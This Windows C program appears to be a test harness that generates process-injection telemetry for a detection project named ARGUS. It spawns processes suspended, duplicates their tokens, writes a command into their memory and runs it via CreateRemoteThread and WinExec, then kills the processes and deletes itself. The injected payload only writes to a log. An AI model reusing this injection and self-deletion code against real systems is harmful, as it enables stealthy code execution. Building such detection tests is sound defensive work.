#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define TEST_DIR "C:\\fyp_test\\"
#define TRIGGER_CHAIN "notepad.exe -> calc.exe -> cmd.exe -> powershell.exe"

void cleanup() {
    Sleep(3000);
    char self[260]; GetModuleFileNameA(NULL, self, 260);
    DeleteFileA(self);
    system("taskkill /f /im notepad.exe /im calc.exe /im cmd.exe /im powershell.exe >nul 2>&1");
    RemoveDirectory(TEST_DIR); ExitProcess(0);
}

DWORD get_process_id(const char* proc_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snapshot, &pe)) {
        do {
            if (!strcmp(pe.szExeFile, proc_name)) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return pid;
}

void trigger_process_chain() {
    char processes[][16] = {"notepad.exe", "calc.exe", "cmd.exe", "powershell.exe"};
    
    for (int i = 0; i < 4; i++) {
        STARTUPINFOA si = {0}; PROCESS_INFORMATION pi;
        
        // Stage 1: Launch target process suspended
        CreateProcessA(NULL, (LPSTR)processes[i], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        
        // Stage 2: Token duplication (privilege escalation sim)
        HANDLE hToken; OpenProcessToken(pi.hProcess, TOKEN_DUPLICATE, &hToken);
        HANDLE hDupToken; DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
        
        // Stage 3: Fileless injection of next process trigger
        char next_cmd[512]; sprintf(next_cmd, "cmd.exe /c echo Triggered %s >> " TEST_DIR "process_chain.txt", processes[i]);
        SIZE_T size = strlen(next_cmd) + 1;
        LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, mem, next_cmd, size, NULL);
        
        // Stage 4: Remote thread execution (INJECTED_INTO chain)
        CreateRemoteThread(pi.hProcess, NULL, 0, 
                          (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec"), 
                          mem, 0, NULL);
        
        ResumeThread(pi.hThread);
        WaitForSingleObject(pi.hProcess, 2000);
        
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        CloseHandle(hToken); CloseHandle(hDupToken);
        Sleep(500);
    }
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE h2, LPSTR lp, int n) {
    CreateDirectoryA(TEST_DIR, NULL);
    
    // Process trigger chain (notepad→calc→cmd→powershell)
    trigger_process_chain();
    
    // Log chain for ARGUS analysis
    FILE* log = fopen(TEST_DIR "process_chain.txt", "w");
    fprintf(log, "ARGUS Process Trigger Chain: %s\nAll terminated safely.", TRIGGER_CHAIN);
    fclose(log);
    
    cleanup();
    return 0;
}